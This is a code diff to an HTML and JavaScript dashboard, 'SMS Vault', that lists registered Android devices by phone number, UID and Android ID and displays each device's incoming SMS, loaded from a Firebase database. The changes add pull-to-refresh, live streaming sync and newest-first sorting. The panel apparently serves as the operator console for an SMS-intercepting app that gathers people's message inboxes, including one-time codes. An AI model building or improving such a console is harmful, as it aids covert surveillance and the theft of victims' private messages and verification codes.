@@ -14,7 +14,15 @@
 }
 *{box-sizing:border-box;margin:0;padding:0}
 html,body{height:100%;background:var(--page);color:var(--text);font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}
-body{min-height:100dvh;overflow:hidden}
+body{min-height:100dvh;overflow:hidden;overscroll-behavior-y:contain;border:0!important;outline:0!important;box-shadow:none!important}
+.app,.sidebar,.brand{border-top:0!important;outline:0!important}
+html,body{border-top:0!important}
+.pull-indicator{position:fixed;z-index:1000;top:8px;left:50%;width:46px;height:46px;border-radius:50%;display:grid;place-items:center;background:linear-gradient(145deg,#ffffff,#e8edf7);color:#18243a;border:1px solid rgba(255,255,255,.78);box-shadow:0 5px 18px rgba(0,0,0,.28),inset 0 1px 0 rgba(255,255,255,.9);opacity:0;pointer-events:none;transform:translate(-50%,-150%) scale(.88);transition:transform .18s cubic-bezier(.2,.8,.2,1),opacity .16s ease}
+.pull-indicator svg{width:27px;height:27px;display:block;fill:currentColor;stroke:none}
+.pull-indicator.visible{opacity:1;transform:translate(-50%,var(--pull-offset,8px)) scale(1)}
+.pull-indicator.refreshing svg{animation:pull-spin .75s linear infinite}
+@keyframes pull-spin{to{transform:rotate(360deg)}}
+.sidebar,.main{overscroll-behavior-y:contain}
 button,input{font:inherit}
 .app{height:100dvh;max-width:1500px;margin:auto;display:grid;grid-template-columns:390px minmax(0,1fr);background:var(--page)}
 .sidebar{min-width:0;display:flex;flex-direction:column;background:linear-gradient(180deg,#191f3b 0%,#121a30 100%);border-right:1px solid var(--line);overflow:hidden}
@@ -121,6 +129,9 @@ button,input{font:inherit}
 </style>
 </head>
 <body>
+<div class="pull-indicator" id="pullIndicator" aria-hidden="true">
+  <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M17.65 6.35A7.95 7.95 0 0 0 12 4a8 8 0 1 0 7.93 9h-2.02A6 6 0 1 1 12 6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
+</div>
 <div class="app">
   <aside class="sidebar">
     <div class="brand">
@@ -131,7 +142,10 @@ button,input{font:inherit}
         <div><div class="brand-name">SMS Vault</div><div class="brand-caption">Message intelligence</div></div>
       </div>
     </div>
-    <div class="list-heading"><span class="eyebrow">Registered devices</span><span class="count" id="userCount">0 devices</span></div>
+    <div class="list-heading">
+      <span class="eyebrow">Registered devices</span>
+      <span class="count" id="userCount">0 devices</span>
+    </div>
     <div class="search-wrap">
       <svg class="search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="m20 20-4-4"/></svg>
       <input type="text" id="searchInput" class="search-box" placeholder="Search phone, UID or device ID..." autocomplete="off">
@@ -145,7 +159,7 @@ button,input{font:inherit}
         <button id="topBackBtn" class="back-btn top-back-btn" aria-label="Back to devices">BACK</button>
         <div><div class="page-title">Overview</div><div class="page-subtitle">Monitor registered devices and incoming messages.</div></div>
       </div>
-      <div class="live-pill"><span class="live-dot"></span> Live sync</div>
+      <div class="live-pill" id="liveStatus"><span class="live-dot"></span> Live sync</div>
     </div>
     <section class="overview" aria-label="Overview statistics">
       <div class="stat-card"><div class="stat-label">TOTAL DEVICES</div><div class="stat-value" id="totalDevices">—</div><div class="stat-foot">Registered numbers</div></div>
@@ -174,6 +188,11 @@ const smsContainer = document.getElementById('smsContainer');
 const headerText = document.getElementById('headerText');
 const searchInput = document.getElementById('searchInput');
 const backBtn = document.getElementById('topBackBtn');
+const pullIndicator = document.getElementById('pullIndicator');
+const liveStatus = document.getElementById('liveStatus');
+let eventStream = null;
+let streamRefreshTimer = null;
+let detailsHistoryActive = false;
 
 function escapeHTML(value) {
   return String(value ?? '').replace(/[&<>"']/g, char => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[char]));
@@ -184,6 +203,18 @@ function formatTime(timestamp) {
   if (Number.isNaN(date.getTime())) return 'Time unavailable';
   return date.toLocaleString('en-IN', {day:'2-digit',month:'short',year:'numeric',hour:'2-digit',minute:'2-digit',hour12:true});
 }
+function parseCreatedAt(value) {
+  if (value === null || value === undefined || value === '') return 0;
+  if (typeof value === 'number' && Number.isFinite(value)) return value < 1e12 ? value * 1000 : value;
+  const raw = String(value).trim();
+  if (!raw) return 0;
+  if (/^\d+(?:\.\d+)?$/.test(raw)) {
+    const numeric = Number(raw);
+    return Number.isFinite(numeric) ? (numeric < 1e12 ? numeric * 1000 : numeric) : 0;
+  }
+  const parsed = Date.parse(raw);
+  return Number.isNaN(parsed) ? 0 : parsed;
+}
 function updateStats() {
   const users = Object.values(allUsersData);
   document.getElementById('totalDevices').textContent = users.length.toLocaleString('en-IN');
@@ -193,11 +224,16 @@ function updateStats() {
 }
 function getFilteredUsers() {
   const term = searchInput.value.trim().toLowerCase();
-  return Object.values(allUsersData).filter(user =>
+  const orderedUsers = Object.values(allUsersData).sort((a,b) =>
+    (b.createdAt - a.createdAt) || a.phone.localeCompare(b.phone)
+  );
+  // Keep serial numbers tied to the full newest-to-oldest device order, even while searching.
+  orderedUsers.forEach((user,index) => { user.serialNo = index + 1; });
+  return orderedUsers.filter(user =>
     user.phone.toLowerCase().includes(term) ||
     user.uid.toLowerCase().includes(term) ||
     user.androidId.toLowerCase().includes(term)
-  ).sort((a,b)=>a.phone.localeCompare(b.phone));
+  );
 }
 function renderUserList(users) {
   userListEl.innerHTML = '';
@@ -211,7 +247,7 @@ function renderUserList(users) {
     button.className = `user-item ${user.phone === currentSelectedPhone ? 'active' : ''}`;
     button.setAttribute('aria-label', `View messages for ${escapeHTML(user.phone)}`);
     button.innerHTML = `
-      <div class="user-index">${index+1}</div>
+      <div class="user-index">${user.serialNo || index+1}</div>
       <div class="user-info">
         <div class="user-phone">${escapeHTML(user.phone)}</div>
         <div class="user-meta"><span>UID ${escapeHTML(user.uid)}</span><span class="meta-dot"></span><span class="sms-count">${user.smsList.length} SMS</span></div>
@@ -242,7 +278,13 @@ function selectUser(phone) {
   renderMessages(user);
   renderUserList(getFilteredUsers());
   updateStats();
-  if (window.innerWidth <= 760) document.body.classList.add('show-details');
+  if (window.innerWidth <= 760) {
+    if (!document.body.classList.contains('show-details')) {
+      history.pushState({smsVaultView:'details'}, '', '#device');
+      detailsHistoryActive = true;
+    }
+    document.body.classList.add('show-details');
+  }
 }
 function fetchData() {
   fetch(DATABASE_URL, {cache:'no-store'})
@@ -265,10 +307,17 @@ function fetchData() {
           }
         }
         smsList.sort((a,b)=>Number(b.time)-Number(a.time));
-        nextUsers[phone] = {phone,uid:String(userDetails.uid || 'N/A'),androidId:String(userDetails.android_id || 'N/A'),smsList};
+        nextUsers[phone] = {
+          phone,
+          uid:String(userDetails.uid || 'N/A'),
+          androidId:String(userDetails.android_id || 'N/A'),
+          createdAt:parseCreatedAt(userDetails.created_at ?? record.created_at),
+          smsList
+        };
       }
       allUsersData = nextUsers;
       updateStats();
+      liveStatus.innerHTML = '<span class="live-dot"></span> Live sync';
       renderUserList(getFilteredUsers());
       if (currentSelectedPhone && allUsersData[currentSelectedPhone]) {
         const selected = allUsersData[currentSelectedPhone];
@@ -281,18 +330,127 @@ function fetchData() {
     })
     .catch(error => {
       console.error('Unable to load SMS data:',error);
+      liveStatus.innerHTML = '<span class="live-dot" style="background:#ffc46b"></span> Reconnecting';
       if (!Object.keys(allUsersData).length) userListEl.innerHTML = '<div class="empty-state sidebar-empty">Could not load records. Check your connection and database access.</div>';
+    })
+    .finally(() => {
+      if (pullRefreshing) finishPullRefresh();
     });
 }
 searchInput.addEventListener('input',()=>renderUserList(getFilteredUsers()));
-backBtn.addEventListener('click',()=>{
+function showDeviceList() {
   document.body.classList.remove('show-details');
   currentSelectedPhone = null;
+  detailsHistoryActive = false;
   renderUserList(getFilteredUsers());
   updateStats();
+}
+backBtn.addEventListener('click',()=>{
+  if (detailsHistoryActive && location.hash === '#device') history.back();
+  else showDeviceList();
 });
+window.addEventListener('popstate',()=>{
+  if (document.body.classList.contains('show-details')) showDeviceList();
+  else if (location.hash !== '#device') detailsHistoryActive = false;
+});
+
+// Native-feeling pull-to-refresh on both the device list and message detail page.
+let pullStartY = 0;
+let pullDistance = 0;
+let pullSurface = null;
+let pullRefreshing = false;
+const PULL_TRIGGER = 78;
+function setPullIndicator(distance) {
+  const visibleDistance = Math.min(distance, 105);
+  pullIndicator.style.setProperty('--pull-offset', `${Math.max(5, visibleDistance - 38)}px`);
+  pullIndicator.style.opacity = String(Math.min(1, distance / 48));
+  pullIndicator.classList.add('visible');
+}
+function finishPullRefresh() {
+  pullRefreshing = false;
+  pullIndicator.classList.remove('refreshing');
+  pullIndicator.classList.remove('visible');
+  pullIndicator.style.removeProperty('--pull-offset');
+  pullIndicator.style.removeProperty('opacity');
+  pullDistance = 0;
+  pullSurface = null;
+}
+function pullStart(event, surface) {
+  if (pullRefreshing || !event.touches || event.touches.length !== 1) return;
+  const atTop = surface === 'list' ? userListEl.scrollTop <= 0 : document.querySelector('.main').scrollTop <= 0;
+  if (!atTop) return;
+  pullStartY = event.touches[0].clientY;
+  pullDistance = 0;
+  pullSurface = surface;
+}
+function pullMove(event) {
+  if (pullSurface === null || pullRefreshing || !event.touches) return;
+  const delta = event.touches[0].clientY - pullStartY;
+  if (delta <= 0) { pullDistance = 0; pullIndicator.classList.remove('visible'); return; }
+  pullDistance = Math.min(delta * 0.55, 105);
+  if (delta > 4) event.preventDefault();
+  setPullIndicator(pullDistance);
+}
+function pullEnd() {
+  if (pullSurface === null || pullRefreshing) return;
+  const shouldRefresh = pullDistance >= PULL_TRIGGER * 0.55;
+  if (shouldRefresh) {
+    pullRefreshing = true;
+    pullIndicator.classList.add('refreshing','visible');
+    pullIndicator.style.setProperty('--pull-offset','12px');
+    pullIndicator.style.opacity = '1';
+    fetchData();
+  } else {
+    finishPullRefresh();
+  }
+}
+const sidebarEl = document.querySelector('.sidebar');
+const mainEl = document.querySelector('.main');
+sidebarEl.addEventListener('touchstart', event => pullStart(event, 'list'), {passive:true});
+sidebarEl.addEventListener('touchmove', pullMove, {passive:false});
+sidebarEl.addEventListener('touchend', pullEnd, {passive:true});
+sidebarEl.addEventListener('touchcancel', finishPullRefresh, {passive:true});
+mainEl.addEventListener('touchstart', event => pullStart(event, 'detail'), {passive:true});
+mainEl.addEventListener('touchmove', pullMove, {passive:false});
+mainEl.addEventListener('touchend', pullEnd, {passive:true});
+mainEl.addEventListener('touchcancel', finishPullRefresh, {passive:true});
+
+// Firebase Realtime Database REST streaming: update immediately when a record changes.
+function connectLiveUpdates() {
+  if (!('EventSource' in window)) {
+    liveStatus.innerHTML = '<span class="live-dot" style="background:#ffc46b"></span> Auto refresh';
+    return;
+  }
+  try {
+    eventStream = new EventSource(DATABASE_URL);
+    const onDatabaseChange = () => {
+      clearTimeout(streamRefreshTimer);
+      streamRefreshTimer = setTimeout(fetchData, 120);
+    };
+    eventStream.addEventListener('put', onDatabaseChange);
+    eventStream.addEventListener('patch', onDatabaseChange);
+    eventStream.onopen = () => {
+      liveStatus.innerHTML = '<span class="live-dot"></span> Live sync';
+    };
+    eventStream.onerror = () => {
+      liveStatus.innerHTML = '<span class="live-dot" style="background:#ffc46b"></span> Reconnecting';
+    };
+  } catch (error) {
+    console.error('Live updates unavailable:', error);
+    liveStatus.innerHTML = '<span class="live-dot" style="background:#ffc46b"></span> Auto refresh';
+  }
+}
+
+document.addEventListener('visibilitychange', () => {
+  if (!document.hidden) fetchData();
+});
+
 fetchData();
-setInterval(fetchData,10000);
+connectLiveUpdates();
+// Fallback refresh only while the Firebase stream is disconnected.
+setInterval(() => {
+  if (!eventStream || eventStream.readyState !== EventSource.OPEN) fetchData();
+}, 30000);
 </script>
 </body>
 </html>
